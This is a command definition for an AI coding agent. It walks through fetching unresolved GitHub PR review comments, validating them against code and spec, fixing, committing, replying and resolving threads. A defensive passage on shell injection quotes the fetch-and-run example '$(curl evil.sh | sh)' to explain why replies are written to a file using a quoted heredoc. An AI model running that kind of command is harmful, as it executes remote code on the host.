---
name: address-reviews
description: Address unresolved PR review feedback — inline threads, review body comments, and general PR comments. Fixes code, replies, and resolves.
argument-hint: "[pr-number]"
allowed-tools: Read, Edit, Glob, Grep, Bash, Agent
---

You are running the `/address-reviews` command. Your job is to fetch unresolved PR review comments, fix the code they reference, reply to each comment, resolve the threads, then commit and push.

## Step 1 — Resolve the PR

If `$ARGUMENTS` is provided, extract the PR number:
- If it's a URL like `https://github.com/<owner>/<repo>/pull/123` or `https://github.com/<owner>/<repo>/pull/123/...`, extract `123`.
- If it's a plain number, use it directly.

If no argument is provided, detect the PR from the current branch:
```bash
gh pr view --json number,headRefName,baseRefName,title
```

If no PR is found, tell the user and stop.

Extract the owner and repo:
```bash
gh repo view --json owner,name -q '.owner.login + "/" + .name'
```

Split the result into `{owner}` and `{repo}` for use in API calls.

## Step 2 — Fetch All Review Comments

Fetch **three** types of review feedback. All three must be checked — inline threads alone are not sufficient.

### 2a — Inline review threads (code-level comments)

Use a single GraphQL query to fetch all review threads with their comments, resolution status, and metadata:

```bash
gh api graphql -f query='
query($owner: String!, $repo: String!, $pr: Int!) {
  repository(owner: $owner, name: $repo) {
    pullRequest(number: $pr) {
      reviewThreads(first: 100) {
        nodes {
          id
          isResolved
          isOutdated
          isCollapsed
          path
          line
          originalLine
          startLine
          diffSide
          comments(first: 50) {
            nodes {
              id
              fullDatabaseId
              body
              author { login }
              createdAt
              path
              line
              originalLine
            }
          }
        }
      }
    }
  }
}
' -f owner="OWNER" -f repo="REPO" -F pr=NUMBER
```

Filter the results:
- **Drop resolved threads** (`isResolved: true`).
- Keep unresolved threads, noting which are `isOutdated: true`.
- For each thread, the first comment is the "root" review comment. Subsequent comments are replies.

### 2b — Review body comments (top-level review text)

Fetch reviews that may contain actionable feedback in their body text (not attached to a specific line):

```bash
gh pr view <number> --repo <owner>/<repo> --json reviews --jq '.reviews[] | select(.body != "" and .body != null) | {id: .id, author: .author.login, state: .state, body: .body, submittedAt: .submittedAt}'
```

Filter:
- Only consider reviews from **non-bot** authors.
- Only consider reviews where the body contains actionable content (not just "LGTM" or approval text).
- Skip reviews authored by the current git user (your own reviews/replies).

### 2c — PR issue comments (general conversation)

Fetch non-inline comments on the PR:

```bash
gh pr view <number> --repo <owner>/<repo> --json comments --jq '.comments[] | {id: .id, author: .author.login, body: .body, createdAt: .createdAt}'
```

Filter:
- Only consider comments from **non-bot** authors.
- Skip comments authored by the current git user.
- Skip comments that are purely informational (evaluation reports, status updates, CI output).

### Combining results

Merge all three sources into a single list of items to classify. Each item should track its **source type** (`inline_thread`, `review_body`, or `issue_comment`) since the reply mechanism differs:
- Inline threads → reply via `repos/{owner}/{repo}/pulls/{pr_number}/comments/{comment_id}/replies` and resolve via GraphQL mutation.
- Review body comments → reply via `gh pr comment` (a new PR comment referencing the review).
- Issue comments → reply via `gh pr comment` (a new PR comment).

If there are zero items across all three sources, tell the user **"No unresolved review comments found — nothing to address."** and stop.

## Step 3 — Classify Each Thread

For each unresolved thread, read the root comment (and any replies for context) and classify it into one of these categories:

| Classification | Criteria | Action |
|---|---|---|
| **Actionable** | Reviewer requests a code change, points out a bug, or identifies something incorrect | Fix code + reply + resolve |
| **Suggestion** | Comment contains a GitHub suggestion block (` ```suggestion `) | Skip fix (user applies via GitHub UI), reply + resolve |
| **Question** | Reviewer asks "why", "what if", or seeks clarification without requesting a change | Reply with explanation + resolve |
| **Outdated** | Thread's `isOutdated` is `true` — the referenced lines have changed since the comment | Flag for user, do not auto-fix |
| **Skip** | Bot boilerplate (author is `coderabbitai[bot]`, `github-actions[bot]`, `dependabot[bot]`, etc.), praise, or simple acknowledgment | Skip entirely |

**Detecting suggestion blocks:** GitHub review comments can contain fenced code blocks with the `suggestion` language tag. Classify these as **Suggestion** — they are best applied via GitHub's one-click "Apply suggestion" button rather than programmatically.

**Grouping related comments:** If multiple threads reference the same file and are conceptually related (e.g., "rename X" and "also rename X in the import"), group them so they are addressed together to avoid redundant or conflicting fixes.

**Conflicting requests:** If two reviewers ask for contradictory changes on the same code, flag the conflict for user decision rather than picking one.

## Step 4 — Validate Each Comment Against Code and Spec

Before accepting any review comment at face value, evaluate whether it actually makes sense. Reviewers can be wrong — they may misread the code, misunderstand the feature's intent, suggest changes that contradict the spec, or flag something that is already handled elsewhere.

For each **Actionable** thread:
1. Read the referenced file and surrounding code to understand the full context (not just the line the comment points to).
2. If the branch matches `feat/NNNN-name`, read `specs/NNNN-name.md` to understand the intended behaviour, the requirement IDs and their acceptance criteria.
3. Evaluate the comment:
   - **Does the reviewer's concern apply?** Sometimes the issue they describe doesn't actually exist (e.g., they missed a null check on a previous line, or the type system already prevents the scenario).
   - **Does the suggested fix align with the spec?** If the spec says "do X" and the reviewer says "do Y", the spec wins. The reviewer may not have read it.
   - **Does it breach a project non-negotiable?** A reviewer asking you to fill a null country, drop a tier, average country percentages, or add a figure without a citation is asking for something this project does not do. Reclassify as **Disagree** and explain, citing `CLAUDE.md`.
   - **Is the comment based on a misunderstanding?** The reviewer may not see the full picture — check if the concern is addressed elsewhere in the diff or codebase.
   - **Is the suggestion actually an improvement?** Some feedback is subjective or would make the code worse. Use your judgment.

Reclassify threads based on this evaluation:
- If the comment is **valid and actionable** → keep as **Actionable** with your planned fix.
- If the comment is **wrong or based on a misunderstanding** → reclassify as **Disagree**. You will reply explaining why the current code is correct, but will NOT change the code. Do not resolve these — leave them open for the reviewer to respond.
- If the comment is **partially valid** → keep as **Actionable** but note what you will and won't change, and why.

For each **Question** thread:
1. Read the code and spec to formulate an accurate, informed answer.

## Step 5 — Present Plan and Wait for Confirmation

Display a classified summary table to the user:

```
# Review Comments — PR #<number>

Found <N> unresolved threads (<A> actionable, <D> disagree, <G> suggestions, <Q> questions, <O> outdated, <S> skipped).

## Actionable Fixes

| # | File | Line | Reviewer | Summary | Planned Fix |
|---|------|------|----------|---------|-------------|
| 1 | src/foo.ts | 42 | @reviewer | "Add null check" | Add null guard before access |

## Disagree (will reply with explanation, no code change, thread left open)

| # | File | Line | Reviewer | Comment | Why Current Code Is Correct |
|---|------|------|----------|---------|----------------------------|
| 2 | src/api.ts | 15 | @reviewer | "This needs error handling" | Already handled by middleware (see src/middleware.ts:30) |

## Suggestions (apply via GitHub UI)

| # | File | Line | Reviewer | Suggestion |
|---|------|------|----------|------------|
| 2 | src/qux.ts | 30 | @reviewer | Replace `foo` with `bar` |

## Questions (will reply, no code change)

| # | File | Line | Reviewer | Question |
|---|------|------|----------|----------|
| 2 | src/baz.ts | 8 | @reviewer | "Why not use the shared util?" |

## Outdated (needs manual review)

| # | File | Line | Reviewer | Comment |
|---|------|------|----------|---------|
| 3 | src/old.ts | 99 | @reviewer | "This should use async/await" |

## Skipped

- <count> bot comments
```

Then ask: **"Proceed with these fixes and replies?"**

Wait for user confirmation before continuing. If the user wants to exclude certain items, adjust the plan accordingly.

## Step 6 — Read Remaining Context

Step 4 already required reading code and spec. If any actionable or question threads still need deeper context (e.g., understanding a utility used elsewhere, checking how a pattern is used across the codebase), read those files now.

## Step 7 — Apply Fixes

For each actionable thread (processing in file order to minimize conflicts):

- **If the comment contains a suggestion block** (fenced code block with `suggestion` language tag): Skip it — these are best applied via GitHub's one-click "Apply suggestion" button. Note it in the report so the user can apply them manually on GitHub.

- **Otherwise:** Understand what the reviewer is asking for, then make the code change using the Edit tool. Make the minimum change needed to address the feedback.

After all edits are applied, run the checks the change warrants:
```bash
npm run lint
npm run build            # if src/ changed
npm run pipeline:pilot   # if pipeline/ changed — read the [validate]/[crosscheck] blocks
```
A fix that breaks a regression anchor is not a fix. Report it rather than pushing it.

If a file referenced by a thread no longer exists at that path, skip it and note it in the report.

## Step 8 — Commit and Push

Stage all modified files (only the specific files that were edited):
```bash
git add <list of modified files>
```

Create a single commit listing all addressed comments:
```bash
git commit -m "$(cat <<'EOF'
fix: address PR review comments

Resolved:
- <file>:<line> — <one-line summary of fix> (@reviewer)
- <file>:<line> — <one-line summary of fix> (@reviewer)
- <file>:<line> — Answered question (@reviewer)

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>
EOF
)"
```

Push:
```bash
git push
```

Capture the commit SHA for use in replies:
```bash
git rev-parse --short HEAD
```

## Step 9 — Reply to Each Comment

For each addressed item (actionable fixes, suggestions, disagree, and questions), reply using the appropriate mechanism based on the source type.

### Never put reply text in a shell command string

The reply templates below quote the reviewer's own words back at them, and anyone who can comment on a PR can choose those words. Inside a double-quoted shell string `` ` ``, `$(...)` and `$VAR` are all live, so a review comment containing `$(curl evil.sh | sh)` would execute on this machine the moment you build the reply.

Write the body to a scratch file first, using a **quoted** heredoc delimiter so the shell expands nothing inside it, and pass the file to `gh`. Point `$SCRATCH` at this session's scratchpad directory:

```bash
cat > "$SCRATCH/reply.md" <<'REPLY_EOF'
<reply text>
REPLY_EOF
```

The quotes around `'REPLY_EOF'` are what disable expansion — without them the heredoc body is still interpolated. Use a fresh file per reply.

### Inline threads

The `{comment_id}` is the `fullDatabaseId` of the **first** comment in the thread (the root comment from the GraphQL response in Step 2).

```bash
gh api repos/{owner}/{repo}/pulls/{pr_number}/comments/{comment_id}/replies \
  -X POST --field body=@"$SCRATCH/reply.md"
```

### Review body comments and issue comments

Reply with a new PR comment that quotes the original and addresses it:

```bash
gh pr comment <number> --repo <owner>/<repo> --body-file "$SCRATCH/reply.md"
```

`--body-file` also sidesteps the `gh pr comment` trap where a body beginning with `-` is parsed as a flag. Note the two commands spell the flag differently — `gh api` takes `--field key=@path`, while `gh pr comment` takes `--body-file path` (its `-F` shorthand means `--body-file`, not `--field`). Prefer the long forms.

When replying to a review body or issue comment, quote the relevant part of the original comment to make the reply contextual (e.g., `> Original reviewer text\n\nYour response`).

### Reply templates

**For actionable fixes:**
```
Fixed in <commit-sha-short>.

<1-2 sentence explanation of what was changed and why.>

🤖 _Generated with [Claude Code](https://claude.com/claude-code)_
```

**For disagree:**
```
I think the current code is correct here — <clear explanation of why, with references to the spec or other code as evidence.>

Happy to discuss further if I'm missing something.

🤖 _Generated with [Claude Code](https://claude.com/claude-code)_
```

**For questions:**
```
<Direct answer to the question, referencing code or spec as needed.>

🤖 _Generated with [Claude Code](https://claude.com/claude-code)_
```

**For suggestions:**
```
Left for you to apply — GitHub's one-click **Apply suggestion** button on this thread commits it as-is, which is cleaner than me retyping it.

<1 sentence on whether the suggestion looks correct, or what to watch for when applying it.>

🤖 _Generated with [Claude Code](https://claude.com/claude-code)_
```

If a reply fails (e.g., permission error), warn and continue with remaining items.

## Step 10 — Resolve Threads

Only **inline review threads** can be resolved via the GitHub API. Review body comments and issue comments have no resolve mechanism — replying is sufficient.

For each addressed inline thread — actionable fixes, suggestions, and questions — resolve using the GraphQL mutation:

```bash
gh api graphql -f query='
  mutation($threadId: ID!) {
    resolveReviewThread(input: {threadId: $threadId}) {
      thread { isResolved }
    }
  }
' -f threadId="<THREAD_NODE_ID>"
```

The `threadId` is the `id` field from `reviewThreads.nodes` in the GraphQL response from Step 2.

**Do NOT resolve:**
- **Disagree** threads — leave open for the reviewer to respond
- Outdated threads (flagged for manual review)
- Skipped threads (bot comments, etc.)

If the mutation fails (e.g., insufficient permissions), warn the user and continue with remaining threads.

## Step 11 — Report to User

Summarize what was done:

```
# Review Comments Addressed — PR #<number>

**Commit:** <sha>

## Fixed (<count>)
- [x] `src/foo.ts:42` — Added null check (@reviewer)
- [x] `src/bar.ts:17` — Renamed to camelCase (@reviewer)

## Answered (<count>)
- [x] `src/baz.ts:8` — Explained shared util choice (@reviewer)

## Disagreed (<count>) — threads left open for discussion
- [ ] `src/api.ts:15` — Explained why error handling is already covered by middleware (@reviewer)

## Needs Manual Review (<count>)
- [ ] `src/old.ts:99` — Outdated thread, lines changed since comment (@reviewer)

## Suggestions (<count>) — apply via GitHub's "Apply suggestion" button
- [ ] `src/qux.ts:30` — Replace `foo` with `bar` (@reviewer)

## Skipped (<count>)
- <count> bot comments

All actionable, suggestion and answered threads have been replied to and resolved on GitHub. Disagreed and outdated threads are left open for your review.
```
